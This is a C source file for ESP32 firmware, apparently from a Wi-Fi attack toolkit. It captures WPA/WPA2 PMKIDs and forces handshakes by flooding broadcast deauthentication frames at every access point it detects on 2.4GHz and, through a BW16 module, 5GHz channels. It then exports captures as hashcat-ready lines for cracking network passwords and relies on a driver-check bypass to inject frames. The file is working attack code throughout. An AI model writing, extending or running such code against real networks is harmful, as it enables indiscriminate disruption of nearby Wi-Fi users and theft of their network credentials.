/*
 * attack_pmkid.c — PMKID Capture from WPA/WPA2 4-Way Handshake
 * 
 * Captures PMKID (RSN PMKID) from EAPOL-Key frames
 * Compatible with hashcat -m 16800/16801 cracking
 * 
 * ESP-IDF v5.x compatible version
 * - Replaced wifi_ieee80211_packet_t with raw buffer access
 * - Replaced ets_delay_us with esp_rom_delay_us
 * - Replaced deprecated promiscuous callback API
 */

#include "attack_pmkid.h"
#include "wsl_bypasser.h"
#include "bw16_uart.h"
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <esp_log.h>
#include <esp_wifi.h>
#include <esp_mac.h>
#include <cJSON.h>
#include <esp_timer.h>
#include <esp_rom_sys.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>

static const char *TAG = "PMKID_CAPTURE";

// ==================== DATA STRUCTURES ====================
static pmkid_capture_t g_pmkid_captures[MAX_PMKID_CAPTURES];
static int g_pmkid_count = 0;
static volatile bool g_pmkid_running = false;
static volatile bool g_pmkid_auto_scan = false;
static volatile uint32_t g_packet_count = 0;
static TaskHandle_t g_pmkid_task = NULL;

// Original promiscuous callback (for chaining)
static wifi_promiscuous_cb_t g_original_promisc_cb = NULL;

// 5GHz channel list
static const uint8_t g_channels_5ghz[] = {
    36, 40, 44, 48,
    52, 56, 60, 64,
    100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144,
    149, 153, 157, 161, 165
};
#define NUM_5GHZ_CHANNELS (sizeof(g_channels_5ghz) / sizeof(g_channels_5ghz[0]))

// 2.4GHz channel list
static const uint8_t g_channels_24ghz[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13};
#define NUM_24GHZ_CHANNELS (sizeof(g_channels_24ghz) / sizeof(g_channels_24ghz[0]))

// ==================== EAPOL & PMKID DETECTION ====================
#define LLC_SNAP_HEADER_LEN 8
#define EAPOL_OFFSET (24 + LLC_SNAP_HEADER_LEN)
#define EAPOL_ETHERTYPE 0x888E
#define RSN_IE_ID 0x30
#define PMKID_LIST_LENGTH_FIELD 2
#define PMKID_MIN_IE_LEN 20

/**
 * @brief Extract PMKID from RSN IE in EAPOL frame
 */
static bool extract_pmkid_from_eapol(const uint8_t *data, int len, uint8_t *pmkid_out) {
    if (!data || !pmkid_out || len < 100) return false;
    
    int offset = 0;
    while (offset < len - 2) {
        uint8_t tag_id = data[offset];
        uint8_t tag_len = data[offset + 1];
        
        if (offset + 2 + tag_len > len) break;
        
        if (tag_id == RSN_IE_ID) {
            if (tag_len < PMKID_MIN_IE_LEN) return false;
            
            int pmkid_offset = 2 + 4 + 2;
            
            uint16_t pairwise_count = data[offset + 2 + 2 + 4] | (data[offset + 2 + 2 + 4 + 1] << 8);
            pmkid_offset += pairwise_count * 4;
            
            uint16_t auth_count_offset = offset + 2 + pmkid_offset;
            if (auth_count_offset + 2 > offset + 2 + tag_len) return false;
            uint16_t auth_count = data[auth_count_offset] | (data[auth_count_offset + 1] << 8);
            pmkid_offset += 2 + auth_count * 4;
            
            pmkid_offset += 2; // RSN capabilities
            
            int pmkid_count_offset = offset + 2 + pmkid_offset;
            if (pmkid_count_offset + 2 > offset + 2 + tag_len) return false;
            uint16_t pmkid_count = data[pmkid_count_offset] | (data[pmkid_count_offset + 1] << 8);
            
            if (pmkid_count == 0) return false;
            
            int pmkid_list_offset = pmkid_count_offset + 2;
            if (pmkid_list_offset + PMKID_LENGTH > offset + 2 + tag_len) return false;
            
            memcpy(pmkid_out, &data[pmkid_list_offset], PMKID_LENGTH);
            return true;
        }
        
        offset += 2 + tag_len;
    }
    
    return false;
}

// ==================== PROMISCUOUS CALLBACK ====================
static void pmkid_promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!g_pmkid_running) {
        if (g_original_promisc_cb) g_original_promisc_cb(buf, type);
        return;
    }
    
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
    
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    uint8_t *payload = (uint8_t *)pkt->payload;
    
    g_packet_count++;
    
    // Check for EAPOL frames
    if (type == WIFI_PKT_DATA && pkt->rx_ctrl.sig_len > EAPOL_OFFSET + 4) {
        int frame_len = pkt->rx_ctrl.sig_len;
        
        if (frame_len > EAPOL_OFFSET + 1) {
            uint16_t ethertype = (payload[EAPOL_OFFSET - 2] << 8) | payload[EAPOL_OFFSET - 1];
            
            if (ethertype == EAPOL_ETHERTYPE) {
                uint8_t *eapol_data = &payload[EAPOL_OFFSET];
                int eapol_len = frame_len - EAPOL_OFFSET;
                
                uint8_t pmkid[PMKID_LENGTH];
                if (extract_pmkid_from_eapol(eapol_data, eapol_len, pmkid)) {
                    // Deduplicate
                    for (int i = 0; i < g_pmkid_count; i++) {
                        if (memcmp(g_pmkid_captures[i].pmkid, pmkid, PMKID_LENGTH) == 0) {
                            return;
                        }
                    }
                    
                    if (g_pmkid_count < MAX_PMKID_CAPTURES) {
                        int idx = g_pmkid_count;
                        
                        uint8_t *addr1 = &payload[4];  // Destination
                        uint8_t *addr2 = &payload[10]; // Source (TA)
                        uint8_t *addr3 = &payload[16]; // BSSID
                        
                        memcpy(g_pmkid_captures[idx].ap_mac, addr3, BSSID_LENGTH);
                        memcpy(g_pmkid_captures[idx].bssid, addr3, BSSID_LENGTH);
                        
                        if (memcmp(addr2, addr3, BSSID_LENGTH) == 0) {
                            memcpy(g_pmkid_captures[idx].sta_mac, addr1, BSSID_LENGTH);
                        } else {
                            memcpy(g_pmkid_captures[idx].sta_mac, addr2, BSSID_LENGTH);
                        }
                        
                        memcpy(g_pmkid_captures[idx].pmkid, pmkid, PMKID_LENGTH);
                        g_pmkid_captures[idx].rssi = pkt->rx_ctrl.rssi;
                        g_pmkid_captures[idx].timestamp_ms = esp_timer_get_time() / 1000;
                        g_pmkid_captures[idx].verified = false;
                        
                        // Try to get SSID from scan results
                        wifi_ap_record_t *records = NULL;
                        uint16_t count = 0;
                        esp_wifi_scan_get_ap_num(&count);
                        if (count > 0) {
                            records = malloc(count * sizeof(wifi_ap_record_t));
                            if (records) {
                                esp_wifi_scan_get_ap_records(&count, records);
                                for (int i = 0; i < count; i++) {
                                    if (memcmp(records[i].bssid, addr3, BSSID_LENGTH) == 0) {
                                        strncpy(g_pmkid_captures[idx].ssid, 
                                                (char *)records[i].ssid, 32);
                                        break;
                                    }
                                }
                                free(records);
                            }
                        }
                        
                        if (g_pmkid_captures[idx].ssid[0] == '\0') {
                            snprintf(g_pmkid_captures[idx].ssid, 32, "<unknown>");
                        }
                        
                        g_pmkid_count++;
                        
                        ESP_LOGI(TAG, "📡 PMKID captured! AP: " MACSTR " (%s), STA: " MACSTR,
                                 MAC2STR(g_pmkid_captures[idx].ap_mac),
                                 g_pmkid_captures[idx].ssid,
                                 MAC2STR(g_pmkid_captures[idx].sta_mac));
                        
                        char pmkid_hex[33];
                        for (int i = 0; i < PMKID_LENGTH; i++) {
                            sprintf(pmkid_hex + i * 2, "%02x", pmkid[i]);
                        }
                        pmkid_hex[32] = '\0';
                        ESP_LOGI(TAG, "   PMKID: %s", pmkid_hex);
                    }
                }
            }
        }
    }
}

// ==================== DEAUTH TO PROVOKE HANDSHAKE ====================
static void send_deauth_for_handshake(uint8_t *bssid, uint8_t channel) {
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint8_t packet[26] = {
        0xC0, 0x00,
        0x00, 0x00,
        broadcast[0], broadcast[1], broadcast[2],
        broadcast[3], broadcast[4], broadcast[5],
        bssid[0], bssid[1], bssid[2],
        bssid[3], bssid[4], bssid[5],
        bssid[0], bssid[1], bssid[2],
        bssid[3], bssid[4], bssid[5],
        0x00, 0x00,
        0x07, 0x00
    };
    
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_rom_delay_us(50);
    
    for (int i = 0; i < 10; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
        esp_rom_delay_us(200);
    }
}

// ==================== PMKID CAPTURE TASK (AUTO-SCAN) ====================
static void pmkid_auto_scan_task(void *params) {
    g_pmkid_running = true;
    g_pmkid_auto_scan = true;
    uint32_t total_deauths = 0;
    
    ESP_LOGI(TAG, "🔍 PMKID auto-scan started — cycling all channels...");
    
    // Phase 1: Scan all 2.4GHz channels
    ESP_LOGI(TAG, "📡 Phase 1: Scanning 2.4GHz channels (1-13)");
    
    for (int ch_idx = 0; ch_idx < NUM_24GHZ_CHANNELS && g_pmkid_running; ch_idx++) {
        uint8_t channel = g_channels_24ghz[ch_idx];
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        vTaskDelay(pdMS_TO_TICKS(100));
        
        wifi_scan_config_t scan_conf = {
            .channel = channel,
            .show_hidden = true,
            .scan_type = WIFI_SCAN_TYPE_ACTIVE,
            .scan_time.active.min = 60,
            .scan_time.active.max = 60,
        };
        
        esp_wifi_scan_start(&scan_conf, true);
        
        uint16_t count = 0;
        esp_wifi_scan_get_ap_num(&count);
        
        if (count > 0) {
            wifi_ap_record_t *records = malloc(count * sizeof(wifi_ap_record_t));
            if (records && esp_wifi_scan_get_ap_records(&count, records) == ESP_OK) {
                for (int i = 0; i < count && i < 5; i++) {
                    ESP_LOGD(TAG, "   Deauthing %s (ch %d)", records[i].ssid, channel);
                    send_deauth_for_handshake(records[i].bssid, channel);
                    total_deauths += 10;
                    vTaskDelay(pdMS_TO_TICKS(200));
                    vTaskDelay(pdMS_TO_TICKS(500));
                }
                free(records);
            }
        }
        
        vTaskDelay(pdMS_TO_TICKS(300));
    }
    
    ESP_LOGI(TAG, "📡 Phase 2: Scanning 5GHz channels via BW16");
    
    for (int ch_idx = 0; ch_idx < NUM_5GHZ_CHANNELS && g_pmkid_running; ch_idx++) {
        uint8_t channel = g_channels_5ghz[ch_idx];
        
        if (bw16_is_connected()) {
            char cmd[64];
            snprintf(cmd, sizeof(cmd), "DEAUTH:CH %d\n", channel);
            bw16_send_command(cmd);
            vTaskDelay(pdMS_TO_TICKS(1000));
        } else {
            break;
        }
        
        if (ch_idx % 10 == 0) vTaskDelay(pdMS_TO_TICKS(10));
    }
    
    ESP_LOGI(TAG, "✅ PMKID auto-scan complete! Deauths sent: %lu", total_deauths);
    ESP_LOGI(TAG, "   PMKIDs captured: %d", g_pmkid_count);
    
    g_pmkid_running = false;
    g_pmkid_auto_scan = false;
    g_pmkid_task = NULL;
    vTaskDelete(NULL);
}

// ==================== PUBLIC API ====================

void pmkid_capture_init(void) {
    // ESP-IDF v5.x: Use esp_wifi_set_promiscuous_rx_cb() instead of deprecated API
    esp_wifi_set_promiscuous(true);
    
    // In ESP-IDF v5.x, we cannot get the old callback directly.
    // Instead, we set our callback directly.
    // The wsl_bypasser already hooks ieee80211_raw_frame_sanity_check.
    esp_wifi_set_promiscuous_rx_cb(pmkid_promiscuous_cb);
    
    g_pmkid_count = 0;
    g_packet_count = 0;
    memset(g_pmkid_captures, 0, sizeof(g_pmkid_captures));
    
    ESP_LOGI(TAG, "PMKID capture initialized (promiscuous mode, ESP-IDF v5.x)");
}

void pmkid_capture_start(uint8_t channel, bool is_5ghz) {
    if (g_pmkid_running) return;
    
    g_pmkid_running = true;
    
    if (is_5ghz && bw16_is_connected()) {
        char cmd[64];
        snprintf(cmd, sizeof(cmd), "CHANNEL %d\n", channel);
        bw16_send_command(cmd);
        
        char deauth_cmd[64];
        snprintf(deauth_cmd, sizeof(deauth_cmd), "DEAUTH:CH %d\n", channel);
        bw16_send_command(deauth_cmd);
    } else {
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        
        wifi_scan_config_t scan_conf = {
            .channel = channel,
            .show_hidden = true,
            .scan_type = WIFI_SCAN_TYPE_ACTIVE,
        };
        esp_wifi_scan_start(&scan_conf, true);
        
        uint16_t count = 0;
        esp_wifi_scan_get_ap_num(&count);
        if (count > 0) {
            wifi_ap_record_t *records = malloc(count * sizeof(wifi_ap_record_t));
            if (records && esp_wifi_scan_get_ap_records(&count, records) == ESP_OK) {
                for (int i = 0; i < count; i++) {
                    send_deauth_for_handshake(records[i].bssid, channel);
                }
                free(records);
            }
        }
    }
    
    ESP_LOGI(TAG, "PMKID capture started on channel %d [%s]", 
             channel, is_5ghz ? "5GHz" : "2.4GHz");
}

void pmkid_capture_stop(void) {
    g_pmkid_running = false;
    g_pmkid_auto_scan = false;
    
    if (bw16_is_connected()) {
        bw16_send_command("STOP\n");
    }
    
    if (g_pmkid_task) {
        vTaskDelay(pdMS_TO_TICKS(100));
        g_pmkid_task = NULL;
    }
    
    ESP_LOGI(TAG, "PMKID capture stopped. Total captured: %d", g_pmkid_count);
}

void pmkid_capture_auto_scan(void) {
    if (g_pmkid_running) {
        pmkid_capture_stop();
        vTaskDelay(pdMS_TO_TICKS(200));
    }
    
    xTaskCreatePinnedToCore(
        pmkid_auto_scan_task,
        "pmkid_scan",
        8192,
        NULL,
        5,
        &g_pmkid_task,
        0
    );
}

int pmkid_capture_get_count(void) {
    return g_pmkid_count;
}

const pmkid_capture_t* pmkid_capture_get(int index) {
    if (index < 0 || index >= g_pmkid_count) return NULL;
    return &g_pmkid_captures[index];
}

void pmkid_capture_clear(void) {
    g_pmkid_count = 0;
    g_packet_count = 0;
    memset(g_pmkid_captures, 0, sizeof(g_pmkid_captures));
    ESP_LOGI(TAG, "PMKID captures cleared");
}

char* pmkid_capture_export_json(void) {
    cJSON *root = cJSON_CreateObject();
    cJSON *pmkids = cJSON_AddArrayToObject(root, "pmkids");
    
    for (int i = 0; i < g_pmkid_count; i++) {
        cJSON *entry = cJSON_CreateObject();
        
        char bssid_str[18];
        snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                 g_pmkid_captures[i].bssid[0], g_pmkid_captures[i].bssid[1],
                 g_pmkid_captures[i].bssid[2], g_pmkid_captures[i].bssid[3],
                 g_pmkid_captures[i].bssid[4], g_pmkid_captures[i].bssid[5]);
        cJSON_AddStringToObject(entry, "bssid", bssid_str);
        
        char sta_str[18];
        snprintf(sta_str, sizeof(sta_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                 g_pmkid_captures[i].sta_mac[0], g_pmkid_captures[i].sta_mac[1],
                 g_pmkid_captures[i].sta_mac[2], g_pmkid_captures[i].sta_mac[3],
                 g_pmkid_captures[i].sta_mac[4], g_pmkid_captures[i].sta_mac[5]);
        cJSON_AddStringToObject(entry, "sta_mac", sta_str);
        
        char pmkid_hex[33];
        for (int j = 0; j < PMKID_LENGTH; j++) {
            sprintf(pmkid_hex + j * 2, "%02x", g_pmkid_captures[i].pmkid[j]);
        }
        pmkid_hex[32] = '\0';
        cJSON_AddStringToObject(entry, "pmkid", pmkid_hex);
        
        cJSON_AddStringToObject(entry, "ssid", g_pmkid_captures[i].ssid);
        cJSON_AddNumberToObject(entry, "rssi", g_pmkid_captures[i].rssi);
        
        char hashcat_line[512];
        snprintf(hashcat_line, sizeof(hashcat_line), "%s*%s*%s*%s",
                 pmkid_hex, bssid_str, sta_str, g_pmkid_captures[i].ssid);
        cJSON_AddStringToObject(entry, "hashcat", hashcat_line);
        
        cJSON_AddItemToArray(pmkids, entry);
    }
    
    cJSON_AddNumberToObject(root, "count", g_pmkid_count);
    cJSON_AddNumberToObject(root, "packets_analyzed", g_packet_count);
    
    char *json = cJSON_Print(root);
    cJSON_Delete(root);
    return json;
}

bool pmkid_capture_is_running(void) {
    return g_pmkid_running;
}

uint32_t pmkid_capture_get_packet_count(void) {
    return g_packet_count;
}
